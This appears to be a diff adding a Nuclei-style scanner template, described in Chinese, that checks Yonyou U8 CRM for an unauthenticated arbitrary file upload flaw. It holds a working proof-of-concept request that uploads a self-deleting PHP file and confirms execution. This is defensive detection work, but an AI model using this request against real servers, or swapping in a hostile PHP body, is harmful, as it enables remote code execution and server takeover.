@@ -1,0 +1,50 @@
+id: yongyou-u8-CRM-files-upload
+
+info:
+  name: 用友U8 CRM uploadfile接口任意文件上传漏洞
+  author: Unknown
+  severity: critical
+  description: 用友U8 CRM系统uploadfile接口未正确验证用户输入，允许攻击者通过构造恶意请求上传任意类型文件。成功利用该漏洞可导致远程代码执行或服务器端文件控制，建议立即应用官方安全补丁以消除风险。
+  tags: 用友U8
+
+flow: |
+  http(1) && http(2)
+
+http:
+- raw:
+  - |
+    POST /ajax/uploadfile.php?DontCheckLogin=1&vname=file HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: multipart/form-data; boundary=----269520967239406871642430066855
+
+    ------269520967239406871642430066855
+    Content-Disposition: form-data; name="file"; filename="1.php "
+    Content-Type: application/octet-stream
+
+    <?php print(111*222);unlink(__FILE__);?>
+    ------269520967239406871642430066855
+    Content-Disposition: form-data; name="upload"
+
+    upload
+    ------269520967239406871642430066855--
+  extractors:
+  - type: regex
+    part: body
+    name: uploadfile
+    group: 1
+    regex:
+    - '(upd\w+\.tmp\.php)'
+    internal: true
+- raw:
+  - |
+    GET /tmpfile/{{uploadfile}} HTTP/1.1
+    Host: {{Hostname}}
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - '24642'
+  - type: status
+    status:
+    - 200
